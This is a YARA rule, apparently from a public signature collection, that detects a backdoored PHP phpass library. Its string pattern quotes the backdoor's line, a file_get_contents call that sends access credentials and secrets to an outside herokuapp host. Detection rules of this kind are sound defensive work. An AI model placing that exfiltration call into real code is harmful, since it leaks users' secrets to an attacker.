rule SIGNATURE_BASE_VULN_PHP_Hack_Backdoored_Phpass_May21 : FILE
{
	meta:
		description = "Detects backdoored PHP phpass version"
		author = "Christian Burkard"
		id = "da13924c-0448-589c-bb2a-ee09736a5602"
		date = "2022-05-24"
		modified = "2023-12-05"
		reference = "https://twitter.com/s0md3v/status/1529005758540808192"
		source_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/vul_backdoor_antitheftweb.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
		logic_hash = "d9669dadc698c6fa63d61857f9ada16a9303aa8bf4139bec75104f2e9f00a36a"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "file_get_contents(\"http://anti-theft-web.herokuapp.com/hacked/$access/$secret\")" ascii

	condition:
		filesize <30KB and $x1
}